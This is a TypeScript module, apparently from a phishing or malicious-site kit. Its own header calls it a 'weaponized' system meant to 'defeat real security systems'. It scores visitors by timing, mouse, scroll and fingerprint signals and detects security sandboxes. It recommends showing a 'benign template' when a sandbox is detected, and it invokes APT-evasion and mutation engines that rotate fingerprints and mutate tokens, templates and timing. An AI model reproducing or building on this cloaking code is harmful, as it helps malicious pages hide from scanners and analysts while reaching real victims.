/**
 * WEAPONIZED STEALTH DETECTION SYSTEM
 * 
 * Combines all stealth-dependent features into a unified detection engine:
 * - Timing analysis (CPU jitter, request patterns, delays)
 * - Human behavior (mouse movements, scroll curves, micro-interactions)
 * - Fingerprint variation (tracking changes over time)
 * - Sandbox detection (multi-layered security sandbox identification)
 * - Anomaly scoring (unified threat assessment)
 * 
 * Purpose: Defeat real security systems by combining multiple detection vectors
 */

import { calculateAnomalyScore, updateBehavior, getBehaviorIdentifier, type UserBehavior } from '@/lib/anomalyDetection'
import { processMicroHumanSignals, type MicroHumanSignals } from '@/lib/behavioral/microHumanModel'
import { detectSandbox, type SandboxDetectionResult } from '@/lib/sandboxDetection'
import { getFingerprintHash } from '@/lib/fingerprinting'
import { executeAPTEvasion, type APTEvasionResult, getRecommendedCloakingLevel } from '@/lib/stealth/aptEvasion'
import { executeMutationEngine, type MutationResult } from '@/lib/stealth/mutationEngine'

export interface WeaponizedDetectionContext {
  // Request data
  ip: string
  userAgent: string
  fingerprint?: string
  fingerprintData?: any
  
  // Timing data
  requestTimestamp: number
  responseTime?: number
  cpuJitter?: number
  timingVariance?: number
  
  // Behavior data
  mouseMovements?: number
  scrollEvents?: number
  keyboardPresses?: number
  timeSpent?: number
  naturalInteractions?: number
  microHumanSignals?: MicroHumanSignals
  
  // Fingerprint variation
  previousFingerprint?: string
  fingerprintHistory?: string[]
  
  // Request context
  referer?: string
  headers?: Record<string, string>
  geoLocation?: string
  
  // Session data
  sessionId?: string
  attemptCount?: number
  requestCount?: number // For APT evasion rotation
  
  // APT Evasion
  enableAPTEvasion?: boolean
  threatModel?: 'low' | 'medium' | 'high' | 'enterprise' | 'apt'
  
  // Mutations
  enableMutations?: boolean
  mutationLevel?: 'low' | 'medium' | 'high' | 'apt'
  token?: string
  template?: string
  baseTiming?: number
}

export interface WeaponizedDetectionResult {
  // Overall threat assessment
  threatScore: number // 0-100 (higher = more suspicious)
  isThreat: boolean
  confidence: number // 0-1
  
  // Component scores
  timingScore: number
  behaviorScore: number
  fingerprintScore: number
  sandboxScore: number
  anomalyScore: number
  
  // Detailed analysis
  timingAnalysis: TimingAnalysis
  behaviorAnalysis: BehaviorAnalysis
  fingerprintAnalysis: FingerprintAnalysis
  sandboxAnalysis: SandboxDetectionResult | null
  anomalyAnalysis: {
    score: number
    reasons: string[]
  }
  
  // APT Evasion results
  aptEvasion?: APTEvasionResult
  
  // Mutation results
  mutations?: MutationResult
  
  // Combined reasons
  reasons: string[]
  recommendations: string[]
}

export interface TimingAnalysis {
  score: number
  cpuJitterDetected: boolean
  timingVariance: number
  requestPattern: 'human' | 'bot' | 'suspicious'
  delays: {
    natural: boolean
    variance: number
  }
  reasons: string[]
}

export interface BehaviorAnalysis {
  score: number
  humanLikeness: number // 0-100
  microHumanScore: number
  movementPattern: 'natural' | 'linear' | 'suspicious'
  interactionQuality: 'high' | 'medium' | 'low'
  reasons: string[]
}

export interface FingerprintAnalysis {
  score: number
  variationDetected: boolean
  variationCount: number
  consistency: number // 0-1
  stability: 'stable' | 'changing' | 'unstable'
  reasons: string[]
}

/**
 * Main weaponized detection function
 * Combines all stealth-dependent features
 */
export async function weaponizedDetection(
  context: WeaponizedDetectionContext
): Promise<WeaponizedDetectionResult> {
  const results: WeaponizedDetectionResult = {
    threatScore: 0,
    isThreat: false,
    confidence: 0.5,
    timingScore: 0,
    behaviorScore: 0,
    fingerprintScore: 0,
    sandboxScore: 0,
    anomalyScore: 0,
    timingAnalysis: {
      score: 0,
      cpuJitterDetected: false,
      timingVariance: 0,
      requestPattern: 'human',
      delays: { natural: false, variance: 0 },
      reasons: [],
    },
    behaviorAnalysis: {
      score: 0,
      humanLikeness: 0,
      microHumanScore: 0,
      movementPattern: 'natural',
      interactionQuality: 'medium',
      reasons: [],
    },
    fingerprintAnalysis: {
      score: 0,
      variationDetected: false,
      variationCount: 0,
      consistency: 1,
      stability: 'stable',
      reasons: [],
    },
    sandboxAnalysis: null,
    anomalyAnalysis: {
      score: 0,
      reasons: [],
    },
    reasons: [],
    recommendations: [],
  }

  // ============================================
  // LAYER 1: TIMING ANALYSIS
  // ============================================
  const timingResult = analyzeTiming(context)
  results.timingAnalysis = timingResult
  results.timingScore = timingResult.score
  results.threatScore += timingResult.score * 0.25 // 25% weight

  // ============================================
  // LAYER 2: BEHAVIOR ANALYSIS
  // ============================================
  const behaviorResult = analyzeBehavior(context)
  results.behaviorAnalysis = behaviorResult
  results.behaviorScore = behaviorResult.score
  results.threatScore += behaviorResult.score * 0.30 // 30% weight

  // ============================================
  // LAYER 3: FINGERPRINT VARIATION ANALYSIS
  // ============================================
  const fingerprintResult = analyzeFingerprintVariation(context)
  results.fingerprintAnalysis = fingerprintResult
  results.fingerprintScore = fingerprintResult.score
  results.threatScore += fingerprintResult.score * 0.20 // 20% weight

  // ============================================
  // LAYER 4: SANDBOX DETECTION
  // ============================================
  if (context.headers) {
    const request = new Request('https://example.com', {
      headers: context.headers as HeadersInit,
    })
    const sandboxResult = await detectSandbox(request)
    results.sandboxAnalysis = sandboxResult
    results.sandboxScore = sandboxResult.isSandbox ? 80 : 0
    results.threatScore += results.sandboxScore * 0.15 // 15% weight
  }

  // ============================================
  // LAYER 5: ANOMALY SCORING
  // ============================================
  const behaviorIdentifier = getBehaviorIdentifier(context.ip, context.fingerprint)
  const behavior = updateBehavior(behaviorIdentifier, {
    fingerprint: context.fingerprint,
    location: context.geoLocation,
    failed: false,
  })
  const anomalyResult = calculateAnomalyScore(behavior)
  results.anomalyAnalysis = anomalyResult
  results.anomalyScore = anomalyResult.score
  results.threatScore += anomalyResult.score * 0.10 // 10% weight

  // ============================================
  // LAYER 6: APT EVASION (if enabled)
  // ============================================
  if (context.enableAPTEvasion && context.fingerprint && context.headers) {
    const threatModel = context.threatModel || 'enterprise'
    const aptConfig = getRecommendedCloakingLevel(threatModel)
    
    const aptResult = await executeAPTEvasion(
      {
        fingerprint: context.fingerprint,
        requestCount: context.requestCount || 1,
        headers: context.headers,
        userAgent: context.userAgent,
        referer: context.referer,
      },
      aptConfig
    )
    
    results.aptEvasion = aptResult
    
    // Apply APT evasion adjustments to threat score
    // Higher evasion = lower detection risk = reduce threat score
    const evasionAdjustment = aptResult.evasionScore * 0.1 // 10% weight
    results.threatScore = Math.max(0, results.threatScore - evasionAdjustment)
    
    // Add APT evasion reasons
    if (aptResult.cloakingActive) {
      results.reasons.push(`APT evasion active: ${aptResult.cloakingTechniques.length} techniques`)
    }
    
    if (aptResult.fingerprintRotated) {
      results.reasons.push(`Fingerprint rotated: ${aptResult.rotationReason}`)
    }
    
    if (aptResult.jitterApplied) {
      results.reasons.push(`Network jitter applied: ${aptResult.jitterDelay.toFixed(0)}ms`)
    }
  }

  // ============================================
  // LAYER 7: MUTATION ENGINE (if enabled)
  // ============================================
  if (context.enableMutations) {
    const mutationLevel = context.mutationLevel || context.threatModel || 'medium'
    
    const mutationResult = await executeMutationEngine(
      {
        token: context.token,
        template: context.template,
        fingerprint: context.fingerprint,
        baseTiming: context.baseTiming || context.responseTime,
        requestCount: context.requestCount || 1,
      },
      {
        enableTokenMutation: true,
        tokenMutationLevel: mutationLevel as any,
        enableTemplateMutation: true,
        templateMutationLevel: mutationLevel as any,
        enableFingerprintMutation: true,
        fingerprintMutationLevel: mutationLevel as any,
        enableTimingMutation: true,
        timingMutationLevel: mutationLevel as any,
        mutationInterval: 5,
        mutationSeed: context.fingerprint,
      }
    )
    
    results.mutations = mutationResult
    
    // Apply mutations to reduce threat score (mutations = evasion)
    const mutationAdjustment = mutationResult.mutationScore * 0.05 // 5% weight
    results.threatScore = Math.max(0, results.threatScore - mutationAdjustment)
    
    // Add mutation reasons
    if (mutationResult.tokenMutated) {
      results.reasons.push(`Token mutated: ${mutationResult.tokenMutationTechnique}`)
    }
    
    if (mutationResult.templateMutated) {
      results.reasons.push(`Template mutated: ${mutationResult.templateMutationTechnique}`)
    }
    
    if (mutationResult.fingerprintMutated) {
      results.reasons.push(`Fingerprint mutated: ${mutationResult.fingerprintMutationTechnique}`)
    }
    
    if (mutationResult.timingMutated) {
      results.reasons.push(`Timing mutated: ${mutationResult.timingMutationTechnique}`)
    }
  }

  // ============================================
  // COMBINE ALL REASONS
  // ============================================
  results.reasons = [
    ...timingResult.reasons,
    ...behaviorResult.reasons,
    ...fingerprintResult.reasons,
    ...(results.sandboxAnalysis?.reasons || []),
    ...anomalyResult.reasons,
  ]

  // ============================================
  // FINAL THREAT ASSESSMENT
  // ============================================
  results.threatScore = Math.min(100, Math.max(0, results.threatScore))
  results.isThreat = results.threatScore >= 60

  // Calculate confidence based on number of signals
  const signalCount = [
    timingResult.score > 0,
    behaviorResult.score > 0,
    fingerprintResult.score > 0,
    results.sandboxScore > 0,
    anomalyResult.score > 0,
    results.aptEvasion ? results.aptEvasion.evasionScore > 0 : false,
  ].filter(Boolean).length

  results.confidence = Math.min(1, 0.3 + signalCount * 0.15)

  // Generate recommendations
  if (results.isThreat) {
    if (results.sandboxScore > 50) {
      results.recommendations.push('Sandbox detected - show benign template')
    }
    if (results.behaviorScore > 50) {
      results.recommendations.push('Bot-like behavior - require CAPTCHA')
    }
    if (results.fingerprintScore > 50) {
      results.recommendations.push('Fingerprint instability - challenge verification')
    }
    if (results.timingScore > 50) {
      results.recommendations.push('Suspicious timing patterns - delay response')
    }
  }

  return results
}

/**
 * Analyze timing patterns for bot/sandbox detection
 */
function analyzeTiming(context: WeaponizedDetectionContext): TimingAnalysis {
  const analysis: TimingAnalysis = {
    score: 0,
    cpuJitterDetected: false,
    timingVariance: 0,
    requestPattern: 'human',
    delays: { natural: false, variance: 0 },
    reasons: [],
  }

  // CPU Jitter Detection
  // Real hardware has CPU jitter (timing variance)
  // VMs/sandboxes have stable timing
  if (context.cpuJitter !== undefined) {
    if (context.cpuJitter < 0.1) {
      // Very stable timing = suspicious (likely VM)
      analysis.score += 30
      analysis.cpuJitterDetected = true
      analysis.reasons.push('CPU jitter too low (likely VM/sandbox)')
    } else if (context.cpuJitter > 5) {
      // Very high jitter = also suspicious (timing manipulation)
      analysis.score += 20
      analysis.reasons.push('CPU jitter abnormally high (possible manipulation)')
    } else {
      // Natural jitter range (0.1-5ms)
      analysis.cpuJitterDetected = true
      analysis.reasons.push('Natural CPU jitter detected')
    }
  }

  // Timing Variance Analysis
  if (context.timingVariance !== undefined) {
    analysis.timingVariance = context.timingVariance
    if (context.timingVariance < 10) {
      // Too consistent = bot pattern
      analysis.score += 25
      analysis.requestPattern = 'bot'
      analysis.reasons.push('Timing variance too low (bot pattern)')
    } else if (context.timingVariance > 1000) {
      // Too variable = suspicious
      analysis.score += 15
      analysis.requestPattern = 'suspicious'
      analysis.reasons.push('Timing variance abnormally high')
    } else {
      // Natural variance
      analysis.requestPattern = 'human'
      analysis.delays.natural = true
      analysis.delays.variance = context.timingVariance
      analysis.reasons.push('Natural timing variance detected')
    }
  }

  // Response Time Analysis
  if (context.responseTime !== undefined) {
    if (context.responseTime < 50) {
      // Too fast = likely automated
      analysis.score += 20
      analysis.reasons.push('Response time suspiciously fast')
    } else if (context.responseTime > 5000) {
      // Too slow = possible sandbox delay
      analysis.score += 15
      analysis.reasons.push('Response time abnormally slow (possible sandbox)')
    }
  }

  return analysis
}

/**
 * Analyze human behavior patterns
 */
function analyzeBehavior(context: WeaponizedDetectionContext): BehaviorAnalysis {
  const analysis: BehaviorAnalysis = {
    score: 0,
    humanLikeness: 0,
    microHumanScore: 0,
    movementPattern: 'natural',
    interactionQuality: 'medium',
    reasons: [],
  }

  // Micro Human Signals (highest weight)
  if (context.microHumanSignals) {
    const microResult = processMicroHumanSignals(context.microHumanSignals)
    analysis.microHumanScore = microResult.score
    analysis.humanLikeness += microResult.score * 2 // Double weight for micro signals
    
    if (microResult.score > 20) {
      analysis.interactionQuality = 'high'
      analysis.reasons.push(`Strong micro-human signals (score: ${microResult.score})`)
    } else if (microResult.score > 10) {
      analysis.interactionQuality = 'medium'
      analysis.reasons.push(`Moderate micro-human signals (score: ${microResult.score})`)
    } else {
      analysis.interactionQuality = 'low'
      analysis.reasons.push(`Weak micro-human signals (score: ${microResult.score})`)
    }
  }

  // Mouse Movement Analysis
  if (context.mouseMovements !== undefined) {
    if (context.mouseMovements < 5) {
      analysis.score += 30
      analysis.movementPattern = 'suspicious'
      analysis.reasons.push('Insufficient mouse movements')
    } else if (context.mouseMovements < 10) {
      analysis.score += 15
      analysis.movementPattern = 'linear'
      analysis.reasons.push('Low mouse movement count')
    } else {
      analysis.movementPattern = 'natural'
      analysis.humanLikeness += 20
      analysis.reasons.push('Adequate mouse movements detected')
    }
  }

  // Scroll Event Analysis
  if (context.scrollEvents !== undefined) {
    if (context.scrollEvents === 0 && context.timeSpent && context.timeSpent > 3000) {
      analysis.score += 25
      analysis.reasons.push('No scroll events despite time spent (bot pattern)')
    } else if (context.scrollEvents > 3) {
      analysis.humanLikeness += 15
      analysis.reasons.push('Natural scroll behavior detected')
    }
  }

  // Natural Interactions
  if (context.naturalInteractions !== undefined) {
    if (context.naturalInteractions === 0 && context.timeSpent && context.timeSpent > 2000) {
      analysis.score += 40
      analysis.reasons.push('No natural interactions detected (bot pattern)')
    } else if (context.naturalInteractions > 5) {
      analysis.humanLikeness += 25
      analysis.reasons.push('Multiple natural interactions detected')
    }
  }

  // Time Spent Analysis
  if (context.timeSpent !== undefined) {
    if (context.timeSpent < 1000) {
      analysis.score += 50
      analysis.reasons.push('Time spent too short (automated)')
    } else if (context.timeSpent >= 2000 && context.timeSpent <= 10000) {
      analysis.humanLikeness += 10
      analysis.reasons.push('Natural time spent on page')
    }
  }

  // Calculate final behavior score (inverted: higher humanLikeness = lower threat)
  analysis.score = Math.max(0, 100 - analysis.humanLikeness)
  analysis.humanLikeness = Math.min(100, analysis.humanLikeness)

  return analysis
}

/**
 * Analyze fingerprint variation over time
 */
function analyzeFingerprintVariation(context: WeaponizedDetectionContext): FingerprintAnalysis {
  const analysis: FingerprintAnalysis = {
    score: 0,
    variationDetected: false,
    variationCount: 0,
    consistency: 1,
    stability: 'stable',
    reasons: [],
  }

  if (!context.fingerprint) {
    analysis.score += 30
    analysis.reasons.push('No fingerprint provided')
    return analysis
  }

  const currentHash = getFingerprintHash(context.fingerprint as any)

  // Compare with previous fingerprint
  if (context.previousFingerprint) {
    const previousHash = getFingerprintHash(context.previousFingerprint as any)
    if (currentHash !== previousHash) {
      analysis.variationDetected = true
      analysis.variationCount = 1
      analysis.consistency = 0.5
      analysis.stability = 'changing'
      analysis.score += 20
      analysis.reasons.push('Fingerprint changed from previous session')
    } else {
      analysis.consistency = 1
      analysis.stability = 'stable'
      analysis.reasons.push('Fingerprint consistent with previous session')
    }
  }

  // Analyze fingerprint history
  if (context.fingerprintHistory && context.fingerprintHistory.length > 0) {
    const uniqueFingerprints = new Set(context.fingerprintHistory.map(fp => getFingerprintHash(fp as any)))
    analysis.variationCount = uniqueFingerprints.size

    if (uniqueFingerprints.size > 5) {
      // Too many variations = suspicious
      analysis.score += 35
      analysis.stability = 'unstable'
      analysis.consistency = 0.2
      analysis.reasons.push(`Excessive fingerprint variations (${uniqueFingerprints.size} unique)`)
    } else if (uniqueFingerprints.size > 2) {
      // Some variation = moderate concern
      analysis.score += 15
      analysis.stability = 'changing'
      analysis.consistency = 0.6
      analysis.reasons.push(`Multiple fingerprint variations (${uniqueFingerprints.size} unique)`)
    } else {
      // Stable fingerprint
      analysis.consistency = 0.9
      analysis.stability = 'stable'
      analysis.reasons.push('Fingerprint history shows stability')
    }
  }

  // Check if current fingerprint matches history
  if (context.fingerprintHistory && context.fingerprintHistory.length > 0) {
    const historyHashes = context.fingerprintHistory.map(fp => getFingerprintHash(fp as any))
    if (!historyHashes.includes(currentHash)) {
      analysis.variationDetected = true
      analysis.score += 10
      analysis.reasons.push('Current fingerprint not in history')
    }
  }

  return analysis
}

/**
 * Get weaponized detection result with simplified API
 */
export async function getWeaponizedThreatScore(
  context: WeaponizedDetectionContext
): Promise<number> {
  const result = await weaponizedDetection(context)
  return result.threatScore
}

/**
 * Check if request should be blocked based on weaponized detection
 */
export async function shouldBlockRequest(
  context: WeaponizedDetectionContext,
  threshold: number = 60
): Promise<boolean> {
  const result = await weaponizedDetection(context)
  return result.threatScore >= threshold
}

